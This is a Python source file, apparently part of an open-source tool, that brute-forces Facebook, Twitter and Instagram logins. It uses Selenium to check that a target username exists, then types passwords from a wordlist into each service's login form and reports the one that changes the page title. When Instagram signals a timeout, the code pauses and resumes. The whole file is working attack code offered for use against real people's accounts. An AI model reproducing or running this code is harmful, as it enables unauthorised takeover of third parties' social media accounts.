 # -*- coding: utf-8 -*-

'''
web.py - Core module for web-based services bruteforce.

Category: Core 
Description: 
    This module provides the methods for bruteforcing web-based services.
    Most of these are built upon the Selenium library for webscraping and manipulation. 
    These include:
    - facebook
    - instagram
    - twitter

Dependencies: main > selenium

Version: v1.0.0
Author: ex0dus
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''

from src.main import *


# Assert: If specified string is NOT found, that means that user has succcessfully logged in.
# The specified string usually means that the search query is erroneous, meaning that no 
# page for the specified user exists.

class WebBruteforce(object):
    def __init__(self, service, username, wordlist, delay):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay

        print P + "[*] Checking if username exists..." + W
        self.usercheck(self.username, self.service)
        if self.usercheck(username, service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        self.webBruteforce(username, wordlist, service, delay)

    def usercheck(self, username, service):
        driver = webdriver.Firefox()
        try:
            if service == "facebook":
                driver.get("https://www.facebook.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
            elif service == "twitter":
                driver.get("https://www.twitter.com/" + username)
                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
                driver.close()
            elif service == "instagram":
                driver.get("https://instagram.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
        except AssertionError:
            return 1


    def webBruteforce(self, username, wordlist, service, delay):
        driver = webdriver.Firefox()
        if service == "facebook":
            driver.get("https://touch.facebook.com/login?soft=auth/")
        elif service == "twitter":
            driver.get("https://mobile.twitter.com/session/new")
            sleep(delay * 2)
        elif service == "instagram":
            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")


        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                # Find username element dependent on service
                if service == "facebook":
                    elem = driver.find_element_by_name("email")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[username_or_email]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("username")
                elem.clear()
                elem.send_keys(username)
                
                # Find password element dependent on service
                if service == "facebook":
                    elem = driver.find_element_by_name("pass")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[password]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("password")
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                
                sleep(delay) # need to wait for page to load, sleep for delay seconds.

                
                # Check for changes in driver.title 
                if service == "facebook":
                    assert (("Log into Facebook | Facebook") in driver.title)
                elif service == "twitter":
                    assert (("Twitter") in driver.title)
                elif service == "instagram":
                    assert (("Log in — Instagram") in driver.title)
                    if TIMEOUT in driver.page_source:
                        print O + "[!] Timeout raised! Waiting... [!]" + W
                        sleep(300)
                
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)

            except AssertionError: 
                # AssertionError: successful login, since we do not see the string in the title, meaning
                # that the page has changed.
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                exit(0)
            except Exception as e:
                print R + ("Error caught! %s" % e) + W                 
                exit(1)


